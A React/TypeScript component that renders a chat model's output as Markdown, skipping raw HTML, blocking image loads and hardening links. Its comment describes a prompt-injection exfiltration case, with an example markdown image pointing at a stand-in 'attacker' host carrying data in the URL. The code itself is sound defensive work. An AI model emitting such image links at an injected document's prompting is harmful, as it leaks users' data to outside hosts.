import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Renders model output as Markdown.
 * - Raw HTML in model output is never rendered (skipHtml).
 * - Images are NOT loaded: a prompt-injected document could make the model emit
 *   ![x](https://attacker/?data=...) and the browser would leak data by fetching it.
 *   We show the alt text instead.
 * - Links open in a new tab without referrer.
 */
export function Markdown({ text }: { text: string }) {
  return (
    <div className="prose-chat break-words">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        skipHtml
        components={{
          img: ({ alt }) => <span className="text-faint">[image not loaded{alt ? `: ${alt}` : ""}]</span>,
          a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer nofollow">{children}</a>,
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
